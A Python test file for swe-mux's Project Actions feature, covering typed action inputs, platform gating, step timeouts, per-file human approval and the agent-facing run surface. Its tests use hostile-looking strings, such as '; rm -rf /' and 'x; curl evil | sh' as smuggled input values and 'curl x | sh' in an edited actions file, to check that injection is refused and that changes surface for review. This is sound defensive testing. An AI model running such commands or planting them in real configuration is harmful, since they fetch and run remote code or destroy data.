"""Project Action format additions, per-file trust, and the agent surface.

Three separate changes with one theme: an action was previously something only a
human could discover, approve, and read the result of.

- The declarative format gained a description, typed inputs, platform gating, and a
  step timeout, so one action can cover a family of commands.
- Approval became per source file, because an agent authoring `.swe-mux/actions.toml`
  used to un-approve the VS Code tasks and the package scripts with it.
- The MCP surface gained `project_actions` (with the authoring reference) and
  `run_action`, whose only authority is the approval a human already gave.
"""

from __future__ import annotations

import asyncio
import json
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest
from aiohttp import web
from aiohttp.test_utils import TestClient, TestServer

from swe_mux import app_keys as keys
from swe_mux.event_bus import EventBus
from swe_mux.project_actions import (
    ProjectActionService,
    current_platform,
    parse_native_actions,
    preview_action_run,
    project_actions_schema,
    read_actions_source,
    substituted_action,
    write_actions_source,
)
from swe_mux.routes.project_actions import (
    _arm_action_timeout,
    diff_project_actions,
    trust_project_actions,
)
from swe_mux.server import error_middleware


def write(root: Path, relative: str, text: str) -> Path:
    path = root / relative
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")
    return path


def catalog_for(tmp_path: Path, toml: str) -> Any:
    root = tmp_path / "project"
    write(root, ".swe-mux/actions.toml", toml)
    return ProjectActionService(tmp_path / "data").catalog(str(root))


def find(catalog: Any, action_id: str) -> Any:
    return next(item for item in catalog.actions if item.id == action_id)


# --- format ------------------------------------------------------------------


def test_an_action_carries_a_description_and_names_its_source_file(tmp_path: Path) -> None:
    """The description is agent-facing above all.

    An id and a label are usually a verb. A caller choosing between `verify` and
    `verify-fast` has nothing else to read, and guessing is how the wrong command
    gets run.
    """
    catalog = catalog_for(
        tmp_path,
        """version = 1
[[actions]]
id = "verify"
label = "Verify"
description = "Run the full test and lint suite."
command = "uv run pytest"
""",
    )

    action = find(catalog, "native:verify")
    assert action.description == "Run the full test and lint suite."
    assert action.source_path == ".swe-mux/actions.toml"


def test_a_package_script_describes_itself_with_its_own_body(tmp_path: Path) -> None:
    root = tmp_path / "project"
    write(root, "package.json", json.dumps({"scripts": {"build": "vite build --mode prod"}}))

    catalog = ProjectActionService(tmp_path / "data").catalog(str(root))

    assert find(catalog, "package:build").description == "vite build --mode prod"


def test_a_step_for_another_platform_is_dropped_and_reported(tmp_path: Path) -> None:
    """One action, two implementations. Refusing it everywhere helps nobody."""
    other = "linux" if current_platform() == "windows" else "windows"
    catalog = catalog_for(
        tmp_path,
        f"""version = 1
[[actions]]
id = "clean"
label = "Clean"
[[actions.steps]]
name = "here"
platforms = ["{current_platform()}"]
command = "echo here"
[[actions.steps]]
name = "elsewhere"
platforms = ["{other}"]
command = "echo elsewhere"
""",
    )

    steps = find(catalog, "native:clean").steps
    assert [step.name for step in steps] == ["here"]
    assert any("do not run on" in item for item in catalog.diagnostics)


def test_an_action_with_no_runnable_step_is_a_diagnostic_not_a_broken_entry(
    tmp_path: Path,
) -> None:
    other = "linux" if current_platform() == "windows" else "windows"
    catalog = catalog_for(
        tmp_path,
        f"""version = 1
[[actions]]
id = "elsewhere"
label = "Elsewhere"
platforms = ["{other}"]
command = "echo elsewhere"
""",
    )

    assert catalog.actions == ()
    assert any("no step runs on" in item for item in catalog.diagnostics)


def test_a_step_timeout_is_bounded_and_travels_with_the_step(tmp_path: Path) -> None:
    catalog = catalog_for(
        tmp_path,
        """version = 1
[[actions]]
id = "slow"
label = "Slow"
command = "sleep 60"
timeout_seconds = 30
""",
    )

    assert find(catalog, "native:slow").steps[0].timeout_seconds == 30.0

    rejected = catalog_for(
        tmp_path / "second",
        """version = 1
[[actions]]
id = "forever"
label = "Forever"
command = "sleep"
timeout_seconds = 0
""",
    )
    assert rejected.actions == ()
    assert any("timeout_seconds" in item for item in rejected.diagnostics)


# --- inputs -------------------------------------------------------------------

DEPLOY = """version = 1
[[actions]]
id = "deploy"
label = "Deploy"
type = "process"
command = "python"
args = ["tools/deploy.py", "--env", "${input:environment}"]

[[actions.inputs]]
id = "environment"
label = "Environment"
kind = "choice"
options = ["staging", "production"]
default = "staging"
"""


def test_an_input_survives_discovery_as_a_template(tmp_path: Path) -> None:
    """The preview, the approval, and the fingerprint all describe the template.

    Filling it in at discovery would mean the approved bytes and the executed
    command could differ, which is the one property the trust boundary rests on.
    """
    catalog = catalog_for(tmp_path, DEPLOY)

    action = find(catalog, "native:deploy")
    assert action.steps[0].args == ("tools/deploy.py", "--env", "${input:environment}")
    assert [item.id for item in action.inputs] == ["environment"]
    assert action.inputs[0].options == ("staging", "production")


def test_substitution_fills_declared_inputs_and_defaults_the_rest(tmp_path: Path) -> None:
    catalog = catalog_for(tmp_path, DEPLOY)
    action = find(catalog, "native:deploy")
    root = Path(catalog.root)

    chosen = substituted_action(action, {"environment": "production"}, root)
    defaulted = substituted_action(action, {}, root)

    assert chosen.steps[0].args == ("tools/deploy.py", "--env", "production")
    assert defaulted.steps[0].args == ("tools/deploy.py", "--env", "staging")


def test_an_input_value_outside_its_options_is_refused(tmp_path: Path) -> None:
    catalog = catalog_for(tmp_path, DEPLOY)
    action = find(catalog, "native:deploy")

    with pytest.raises(ValueError, match="must be one of"):
        substituted_action(action, {"environment": "; rm -rf /"}, Path(catalog.root))


def test_an_unknown_input_key_is_refused_rather_than_ignored(tmp_path: Path) -> None:
    """A misspelled key would otherwise substitute empty and run the wrong command."""
    catalog = catalog_for(tmp_path, DEPLOY)
    action = find(catalog, "native:deploy")

    with pytest.raises(ValueError, match="unknown inputs"):
        substituted_action(action, {"enviroment": "production"}, Path(catalog.root))


def test_referencing_an_undeclared_input_fails_the_whole_file(tmp_path: Path) -> None:
    catalog = catalog_for(
        tmp_path,
        """version = 1
[[actions]]
id = "deploy"
label = "Deploy"
command = "deploy ${input:missing}"
""",
    )

    assert catalog.actions == ()
    assert any("undeclared input" in item for item in catalog.diagnostics)


def test_an_input_in_an_unquoted_shell_command_is_refused_at_discovery(
    tmp_path: Path,
) -> None:
    """The one place a substituted value would reach a shell as syntax.

    A `shell` step with no args passes its command string through untouched, so
    `command = "git checkout ${input:branch}"` with `branch = "x; curl evil | sh"`
    would run a second command no human approved. That is exactly the property the
    trust boundary rests on, so the shape is refused rather than quoted: quoting
    needs the shell dialect, which is not resolved until spawn.
    """
    catalog = catalog_for(
        tmp_path,
        """version = 1
[[actions]]
id = "checkout"
label = "Checkout"
type = "shell"
command = "git checkout ${input:branch}"

[[actions.inputs]]
id = "branch"
label = "Branch"
default = "main"
""",
    )

    assert catalog.actions == ()
    assert any("cannot carry an input" in item for item in catalog.diagnostics)


def test_the_same_value_is_allowed_in_args_where_it_is_quoted(tmp_path: Path) -> None:
    """`_shell_command_line` quotes each arg in the target shell's own dialect."""
    catalog = catalog_for(
        tmp_path,
        """version = 1
[[actions]]
id = "checkout"
label = "Checkout"
type = "shell"
command = "git"
args = ["checkout", "${input:branch}"]

[[actions.inputs]]
id = "branch"
label = "Branch"
default = "main"
""",
    )
    action = find(catalog, "native:checkout")

    filled = substituted_action(action, {"branch": "x; curl evil | sh"}, Path(catalog.root))

    # The value stays one argument. The quoting happens in `action_spawn_body`, and
    # the point here is that it *reaches* the quoting path at all.
    assert filled.steps[0].args == ("checkout", "x; curl evil | sh")


def test_a_process_step_may_carry_an_input_in_its_command(tmp_path: Path) -> None:
    """No shell is involved, so there is no syntax for a value to become."""
    catalog = catalog_for(
        tmp_path,
        """version = 1
[[actions]]
id = "run"
label = "Run"
type = "process"
command = "${input:tool}"

[[actions.inputs]]
id = "tool"
label = "Tool"
default = "pytest"
""",
    )

    assert find(catalog, "native:run").steps[0].command == "${input:tool}"


def test_a_choice_input_without_a_default_takes_its_first_option(tmp_path: Path) -> None:
    """Otherwise it is unrunnable as presented: "" matches no option.

    The select renders blank, submitting it fails the same validation, and an agent
    that omits the key gets the identical error.
    """
    catalog = catalog_for(
        tmp_path,
        """version = 1
[[actions]]
id = "deploy"
label = "Deploy"
type = "process"
command = "deploy"
args = ["${input:environment}"]

[[actions.inputs]]
id = "environment"
label = "Environment"
kind = "choice"
options = ["staging", "production"]
""",
    )
    action = find(catalog, "native:deploy")

    assert action.inputs[0].default == "staging"
    assert substituted_action(action, {}, Path(catalog.root)).steps[0].args == ("staging",)


def test_an_input_naming_a_directory_is_still_contained_after_substitution(
    tmp_path: Path,
) -> None:
    """Containment cannot be checked against a template, so it is checked twice."""
    catalog = catalog_for(
        tmp_path,
        """version = 1
[[actions]]
id = "build"
label = "Build"
command = "make"
cwd = "${input:where}"

[[actions.inputs]]
id = "where"
label = "Where"
default = "src"
""",
    )
    action = find(catalog, "native:build")

    with pytest.raises(ValueError, match="must stay inside"):
        substituted_action(action, {"where": "../../elsewhere"}, Path(catalog.root))


def test_vscode_prompt_inputs_are_imported(tmp_path: Path) -> None:
    root = tmp_path / "project"
    write(
        root,
        ".vscode/tasks.json",
        json.dumps(
            {
                "version": "2.0.0",
                "tasks": [
                    {
                        "label": "deploy",
                        "type": "shell",
                        "command": "deploy",
                        "args": ["--env", "${input:environment}"],
                        "detail": "Deploy somewhere",
                    },
                    # The unquotable shape, which is refused for an imported task on
                    # exactly the same grounds as for a native one.
                    {
                        "label": "unsafe",
                        "type": "shell",
                        "command": "git checkout ${input:environment}",
                    },
                ],
                "inputs": [
                    {
                        "id": "environment",
                        "type": "pickString",
                        "description": "Environment",
                        "options": ["dev", "prod"],
                        "default": "dev",
                    },
                    # A `command` input runs an editor command, which has no meaning
                    # outside VS Code and would be a second execution path if it did.
                    {"id": "ignored", "type": "command", "command": "extension.pick"},
                ],
            }
        ),
    )

    catalog = ProjectActionService(tmp_path / "data").catalog(str(root))

    action = find(catalog, "vscode:deploy")
    assert action.description == "Deploy somewhere"
    assert [item.id for item in action.inputs] == ["environment"]
    assert action.inputs[0].kind == "choice"
    assert [item.id for item in catalog.actions] == ["vscode:deploy"]
    assert any("cannot carry an input" in item for item in catalog.diagnostics)


# --- per-file trust -----------------------------------------------------------


def three_file_project(tmp_path: Path) -> tuple[Path, ProjectActionService]:
    root = tmp_path / "project"
    write(root, "package.json", json.dumps({"scripts": {"dev": "vite"}}))
    write(
        root,
        ".vscode/tasks.json",
        json.dumps({"version": "2.0.0", "tasks": [{"label": "api", "command": "python -m api"}]}),
    )
    write(
        root,
        ".swe-mux/actions.toml",
        'version = 1\n[[actions]]\nid = "verify"\nlabel = "Verify"\ncommand = "pytest"\n',
    )
    return root, ProjectActionService(tmp_path / "data")


def test_editing_one_task_file_leaves_the_other_two_approved(tmp_path: Path) -> None:
    """The change that made this necessary: agents now author actions.

    With one combined digest, an agent writing `.swe-mux/actions.toml` un-trusted
    the VS Code tasks and the package scripts as well, so every Run menu entry
    needed a fresh human approval for a change that touched none of them.
    """
    root, service = three_file_project(tmp_path)
    catalog = service.catalog(str(root))
    service.trust(str(root), catalog.fingerprint)
    assert service.catalog(str(root)).trusted

    write(
        root,
        ".swe-mux/actions.toml",
        'version = 1\n[[actions]]\nid = "verify"\nlabel = "Verify"\ncommand = "pytest -x"\n',
    )
    after = service.catalog(str(root))

    assert not after.trusted
    assert after.trusted_paths() == {"package.json", ".vscode/tasks.json"}
    assert find(after, "package:dev").snapshot(trusted=True)["trusted"] is True
    # The action from the edited file is the only one that stops being runnable.
    with pytest.raises(PermissionError, match=".swe-mux/actions.toml"):
        service.action(str(root), "native:verify")
    service.action(str(root), "package:dev")


def test_preview_resolves_a_spoken_action_name_against_the_real_catalog(
    tmp_path: Path,
) -> None:
    """The conversational surfaces name an action the way a person does.

    A title, not an id, and possibly a fragment of one. The resolver answers a
    miss and an ambiguity with candidates rather than a guess, because running
    the wrong approved command is worse than asking which one.
    """
    root, service = three_file_project(tmp_path)
    service.trust(str(root), service.catalog(str(root)).fingerprint)
    catalog = service.catalog(str(root))

    exact = preview_action_run(catalog, "Verify", {}, project_label="Work")
    assert exact["action_id"] == "native:verify"
    assert exact["steps"] == 1
    # By id, by case-insensitive title, and by fragment.
    assert preview_action_run(catalog, "native:verify", {}, project_label="Work")[
        "action_id"
    ] == "native:verify"
    assert preview_action_run(catalog, "veri", {}, project_label="Work")[
        "action_id"
    ] == "native:verify"

    missing = preview_action_run(catalog, "publish", {}, project_label="Work")
    assert "no action" in missing["error"]
    assert "Verify" in missing["candidates"]


def test_preview_refuses_an_unapproved_action_by_naming_its_file(tmp_path: Path) -> None:
    """The one answer that is useful: neither an agent nor the assistant can
    approve an action, so the refusal names the file a human has to review."""
    root, service = three_file_project(tmp_path)
    native = next(
        item for item in service.catalog(str(root)).files
        if item.path == ".swe-mux/actions.toml"
    )
    service.trust(str(root), native.fingerprint, source=native.path)
    catalog = service.catalog(str(root))

    refused = preview_action_run(catalog, "dev", {}, project_label="Work")

    assert refused["trust_required"] is True
    assert refused["file"] == "package.json"
    assert "not approved" in refused["error"]
    # The approved file's action is unaffected: trust is per source file.
    assert preview_action_run(catalog, "Verify", {}, project_label="Work")["action_id"]


def test_preview_rejects_an_input_the_action_would_refuse(tmp_path: Path) -> None:
    """Validated through `substituted_action`, not a second copy of that rule."""
    root = tmp_path / "project"
    write(
        root,
        ".swe-mux/actions.toml",
        'version = 1\n[[actions]]\nid = "deploy"\nlabel = "Deploy"\n'
        'command = "deploy"\nargs = ["${input:target}"]\n'
        '[[actions.inputs]]\nid = "target"\nkind = "choice"\n'
        'options = ["staging", "prod"]\n',
    )
    service = ProjectActionService(tmp_path / "data")
    service.trust(str(root), service.catalog(str(root)).fingerprint)
    catalog = service.catalog(str(root))

    assert preview_action_run(
        catalog, "Deploy", {"target": "staging"}, project_label="Work"
    )["action_id"] == "native:deploy"
    bad_value = preview_action_run(
        catalog, "Deploy", {"target": "moon"}, project_label="Work"
    )
    assert "must be one of" in bad_value["error"]
    unknown_key = preview_action_run(
        catalog, "Deploy", {"targett": "staging"}, project_label="Work"
    )
    assert "unknown inputs" in unknown_key["error"]


def test_one_file_can_be_approved_on_its_own(tmp_path: Path) -> None:
    root, service = three_file_project(tmp_path)
    catalog = service.catalog(str(root))
    native = next(item for item in catalog.files if item.path == ".swe-mux/actions.toml")

    after = service.trust(str(root), native.fingerprint, source=native.path)

    assert after.trusted_paths() == {".swe-mux/actions.toml"}
    assert not after.trusted
    service.action(str(root), "native:verify")
    with pytest.raises(PermissionError):
        service.action(str(root), "package:dev")


def test_approving_a_stale_digest_is_refused(tmp_path: Path) -> None:
    root, service = three_file_project(tmp_path)
    catalog = service.catalog(str(root))
    write(root, ".swe-mux/actions.toml", "version = 1\n")

    with pytest.raises(ValueError, match="review"):
        service.trust(str(root), catalog.fingerprint)


def test_a_legacy_whole_catalog_approval_is_honoured_and_upgraded(tmp_path: Path) -> None:
    """The stored format before per-file trust was one digest as a bare string.

    An unchanged repository must stay approved across the upgrade: a daemon that
    silently re-prompted every Project would look broken.
    """
    root, service = three_file_project(tmp_path)
    catalog = service.catalog(str(root))
    service.path.parent.mkdir(parents=True, exist_ok=True)
    service.path.write_text(
        json.dumps({str(Path(root).resolve()): catalog.fingerprint}), encoding="utf-8"
    )

    assert service.catalog(str(root)).trusted

    # And once anything changes, the old format cannot say which file moved, so it
    # stops covering anything rather than guessing.
    write(root, "package.json", json.dumps({"scripts": {"dev": "vite --host"}}))
    assert service.catalog(str(root)).trusted_paths() == frozenset()


def test_the_approved_bytes_are_retained_so_a_change_can_be_shown(tmp_path: Path) -> None:
    """"These files changed" cannot separate a renamed label from a new `curl | sh`."""
    root, service = three_file_project(tmp_path)
    service.trust(str(root), service.catalog(str(root)).fingerprint)

    approved = service.approved_source(str(Path(root).resolve()), ".swe-mux/actions.toml")

    assert approved is not None
    assert 'id = "verify"' in approved


def test_a_never_approved_file_is_distinguished_from_one_whose_bytes_were_dropped(
    tmp_path: Path,
) -> None:
    """Both produce an empty diff, and they mean different things.

    "Never approved" is a first look. "Approved bytes not retained" still means the
    file changed, it just cannot show how, and a reader who cannot tell them apart
    reads the second as the first and approves more easily than they should.
    """
    root, service = three_file_project(tmp_path)
    resolved = str(Path(root).resolve())

    assert not service.was_approved(resolved, ".swe-mux/actions.toml")

    service.trust(str(root), service.catalog(str(root)).fingerprint)
    write(root, ".swe-mux/actions.toml", 'version = 1\n[[actions]]\nid = "x"\ncommand = "y"\n')

    assert service.was_approved(resolved, ".swe-mux/actions.toml")
    assert service.approved_source(resolved, ".swe-mux/actions.toml") is not None


def test_a_project_with_no_task_files_is_not_trusted(tmp_path: Path) -> None:
    root = tmp_path / "empty"
    root.mkdir()

    catalog = ProjectActionService(tmp_path / "data").catalog(str(root))

    assert catalog.actions == ()
    assert not catalog.trusted


# --- the authoring reference --------------------------------------------------


@pytest.mark.asyncio
async def test_the_approval_diff_shows_what_changed_since_the_last_approval(
    tmp_path: Path,
) -> None:
    root, service = three_file_project(tmp_path)
    service.trust(str(root), service.catalog(str(root)).fingerprint)
    write(
        root,
        ".swe-mux/actions.toml",
        'version = 1\n[[actions]]\nid = "verify"\nlabel = "Verify"\ncommand = "curl x | sh"\n',
    )
    project = SimpleNamespace(id="p1", root=str(root), name="Work")
    app = web.Application(middlewares=[error_middleware])
    app[keys.PROJECTS] = SimpleNamespace(projects={project.id: project})
    app[keys.PROJECT_ACTIONS] = service
    app[keys.EVENTS] = EventBus()
    app.router.add_get("/projects/{project_id}/actions/diff", diff_project_actions)
    app.router.add_post("/projects/{project_id}/actions/trust", trust_project_actions)

    async with TestClient(TestServer(app)) as client:
        payload = await (await client.get("/projects/p1/actions/diff")).json()
        native = next(
            item for item in payload["sources"] if item["path"] == ".swe-mux/actions.toml"
        )
        # Approving that one file leaves the others exactly as they were.
        approved = await (
            await client.post(
                "/projects/p1/actions/trust",
                json={"source": native["path"], "fingerprint": native["fingerprint"]},
            )
        ).json()

    assert native["status"] == "changed"
    assert '-command = "pytest"' in native["diff"]
    assert '+command = "curl x | sh"' in native["diff"]
    unchanged = next(
        item for item in payload["sources"] if item["path"] == "package.json"
    )
    assert unchanged["status"] == "unchanged"
    assert approved["trusted"] is True


@pytest.mark.asyncio
async def test_a_step_timeout_stops_a_session_that_is_still_running() -> None:
    """The bound has to reach the process, not only the declaration.

    Deliberately not restored across a daemon restart: the alternative is
    persisting a deadline per session and reconciling it at adoption, which is real
    machinery for a bound whose job is stopping a runaway task on the machine the
    user is at.
    """
    stopped: list[str] = []
    live = SimpleNamespace(record=SimpleNamespace(id="task-1", state="running"))

    async def stop(sid: str) -> None:
        stopped.append(sid)

    app: dict[str, Any] = {
        keys.SESSIONS: SimpleNamespace(sessions={"task-1": live}, stop=stop),
        keys.EVENTS: EventBus(),
        keys.ACTION_TIMEOUT_TASKS: set(),
    }
    step = SimpleNamespace(name="slow", timeout_seconds=0.01)

    _arm_action_timeout(app, "task-1", step, "p1", "native:slow")  # type: ignore[arg-type]
    await asyncio.gather(*app[keys.ACTION_TIMEOUT_TASKS])

    assert stopped == ["task-1"]


@pytest.mark.asyncio
@pytest.mark.parametrize("state", ["exited", "crashed"])
async def test_a_timeout_does_nothing_to_a_step_that_already_finished(state: str) -> None:
    """A finished one-shot step is retained in the live table, not removed.

    Its scrollback and exit code are what a task result is read from, so the timer
    has to test the state rather than a lookup miss. Guarding on the string "ended",
    which `SessionState` does not contain, meant a 3600-second timeout fired an hour
    after a 20-second step succeeded and reported a timeout for it.
    """
    stopped: list[str] = []
    finished = SimpleNamespace(record=SimpleNamespace(id="task-1", state=state))

    async def stop(sid: str) -> None:  # pragma: no cover - must never run
        stopped.append(sid)

    app: dict[str, Any] = {
        keys.SESSIONS: SimpleNamespace(sessions={"task-1": finished}, stop=stop),
        keys.EVENTS: EventBus(),
        keys.ACTION_TIMEOUT_TASKS: set(),
    }
    events = app[keys.EVENTS].subscribe(name="test")
    step = SimpleNamespace(name="quick", timeout_seconds=0.01)

    _arm_action_timeout(app, "task-1", step, "p1", "native:quick")  # type: ignore[arg-type]
    await asyncio.gather(*app[keys.ACTION_TIMEOUT_TASKS])

    assert stopped == []
    assert events.qsize() == 0


@pytest.mark.asyncio
async def test_a_timeout_does_nothing_to_a_session_that_was_removed() -> None:
    stopped: list[str] = []

    async def stop(sid: str) -> None:  # pragma: no cover - must never run
        stopped.append(sid)

    app: dict[str, Any] = {
        keys.SESSIONS: SimpleNamespace(sessions={}, stop=stop),
        keys.EVENTS: EventBus(),
        keys.ACTION_TIMEOUT_TASKS: set(),
    }
    step = SimpleNamespace(name="quick", timeout_seconds=0.01)

    _arm_action_timeout(app, "task-1", step, "p1", "native:quick")  # type: ignore[arg-type]
    await asyncio.gather(*app[keys.ACTION_TIMEOUT_TASKS])

    assert stopped == []


# --- authoring from the UI ------------------------------------------------------


def test_a_project_with_no_actions_file_opens_on_a_working_template(tmp_path: Path) -> None:
    """A missing file is the ordinary state, not an error.

    The template has to parse, or the first thing a new author sees after pressing
    Save is a syntax error in text they did not write.
    """
    root = tmp_path / "project"
    root.mkdir()

    source = read_actions_source(str(root))

    assert source["exists"] is False
    assert source["starter"] is True
    assert source["revision"] == "missing"
    actions, diagnostics = parse_native_actions(source["text"], root)
    assert [item.id for item in actions] == ["native:example"]
    assert diagnostics == []


def test_saving_validates_before_writing_so_a_broken_file_never_lands(
    tmp_path: Path,
) -> None:
    root = tmp_path / "project"
    write(root, ".swe-mux/actions.toml", 'version = 1\n[[actions]]\nid = "ok"\ncommand = "echo"\n')
    before = (root / ".swe-mux" / "actions.toml").read_text(encoding="utf-8")
    revision = read_actions_source(str(root))["revision"]

    with pytest.raises(ValueError, match="TOML syntax error"):
        write_actions_source(str(root), "version = 1\n[[actions]\nid=", revision)
    with pytest.raises(ValueError, match="version = 1"):
        write_actions_source(str(root), "version = 2\n", revision)

    # The working file is untouched by either refusal.
    assert (root / ".swe-mux" / "actions.toml").read_text(encoding="utf-8") == before


def test_saving_refuses_a_stale_revision(tmp_path: Path) -> None:
    """Two browsers editing one file must not silently clobber each other."""
    root = tmp_path / "project"
    write(root, ".swe-mux/actions.toml", 'version = 1\n[[actions]]\nid = "a"\ncommand = "echo"\n')
    stale = read_actions_source(str(root))["revision"]
    write(root, ".swe-mux/actions.toml", 'version = 1\n[[actions]]\nid = "b"\ncommand = "echo"\n')

    with pytest.raises(ValueError, match="changed elsewhere"):
        write_actions_source(str(root), "version = 1\n", stale)


def test_saving_creates_the_file_and_its_directory(tmp_path: Path) -> None:
    root = tmp_path / "project"
    root.mkdir()

    diagnostics = write_actions_source(
        str(root),
        'version = 1\n[[actions]]\nid = "hello"\nlabel = "Hello"\ncommand = "echo hi"\n',
        "missing",
    )

    assert diagnostics == []
    catalog = ProjectActionService(tmp_path / "data").catalog(str(root))
    assert [item.id for item in catalog.actions] == ["native:hello"]


def test_saving_returns_diagnostics_without_refusing_a_parseable_file(
    tmp_path: Path,
) -> None:
    """A file that parses but reports an import problem is still the user's to keep.

    Refusing it would trap someone mid-edit on a multi-action file where only one
    entry is wrong.
    """
    root = tmp_path / "project"
    root.mkdir()

    diagnostics = write_actions_source(
        str(root),
        'version = 1\n[[actions]]\nid = "a"\nlabel = "A"\ncommand = "echo"\n'
        '[[actions.inputs]]\nid = "unused"\nlabel = "Unused"\ndefault = "x"\n',
        "missing",
    )

    assert any("never referenced" in item for item in diagnostics)
    assert (root / ".swe-mux" / "actions.toml").is_file()


def test_saving_un_approves_the_file_it_just_wrote(tmp_path: Path) -> None:
    """The editor must not be able to approve its own command.

    An author who can write a command and grant it authority in one step makes the
    approval meaningless, so a save always returns the file to unapproved.
    """
    root = tmp_path / "project"
    write(root, ".swe-mux/actions.toml", 'version = 1\n[[actions]]\nid = "a"\ncommand = "echo"\n')
    service = ProjectActionService(tmp_path / "data")
    service.trust(str(root), service.catalog(str(root)).fingerprint)
    assert service.catalog(str(root)).trusted

    write_actions_source(
        str(root),
        'version = 1\n[[actions]]\nid = "a"\ncommand = "echo changed"\n',
        read_actions_source(str(root))["revision"],
    )

    assert not service.catalog(str(root)).trusted


def test_this_repository_ships_actions_that_parse() -> None:
    """This checkout's `.swe-mux/actions.toml` is a worked example, so it must load.

    It is the only Project Actions fixture that exercises the real format against
    real commands rather than against a string written inside a test, which is why
    it survives `.swe-mux/` becoming untracked (2026-08-28) rather than being
    deleted with its subject.

    Three outcomes, and keeping them distinct is the point:

    - **Absent** - skipped. `.swe-mux/` is ignored end to end as per-machine state,
      so a fresh clone and CI have no such file and there is nothing to validate.
    - **Present and well-formed** - passes, having checked the whole guard below.
    - **Present and malformed** - fails, which is the case that actually costs
      someone something: a broken actions.toml breaks the Run menu on the machine
      that has it.

    The skip must never widen to cover the third case. A file that exists and does
    not parse is a real failure, and an `except` around the read or a truthiness
    check on the parse result would hide it.
    """
    root = Path(__file__).resolve().parents[1]
    source = root / ".swe-mux" / "actions.toml"
    if not source.is_file():
        pytest.skip(
            "No .swe-mux/actions.toml in this checkout. The directory is per-machine "
            "operator state and deliberately untracked, so a clone carries no actions "
            "file for this test to validate. Nothing is wrong; there is no subject."
        )

    actions, diagnostics = parse_native_actions(source.read_text(encoding="utf-8"), root)

    by_id = {item.id: item for item in actions}
    assert {"native:verify", "native:test", "native:frontend", "native:checks"} <= set(by_id)
    assert diagnostics == []
    assert all(item.description for item in actions), "every shipped action states its purpose"
    # The filtered-test action is the one that demonstrates inputs, and its value
    # must sit in `args` where it is quoted rather than in a bare shell command.
    filtered = by_id["native:test"]
    assert [item.id for item in filtered.inputs] == ["pattern"]
    assert any("${input:pattern}" in argument for argument in filtered.steps[0].args)
    assert by_id["native:checks"].steps[0].name == "ruff"


def test_the_authoring_reference_ships_as_a_package_asset() -> None:
    """One file serves both readers, so the copy an agent reads cannot drift."""
    schema = project_actions_schema()

    assert "# Authoring `.swe-mux/actions.toml`" in schema
    assert "${input:" in schema
    assert "timeout_seconds" in schema
    assert "platforms" in schema
    # The manifest-not-a-program rule is the one thing an author must take away.
    assert "not a program" in schema
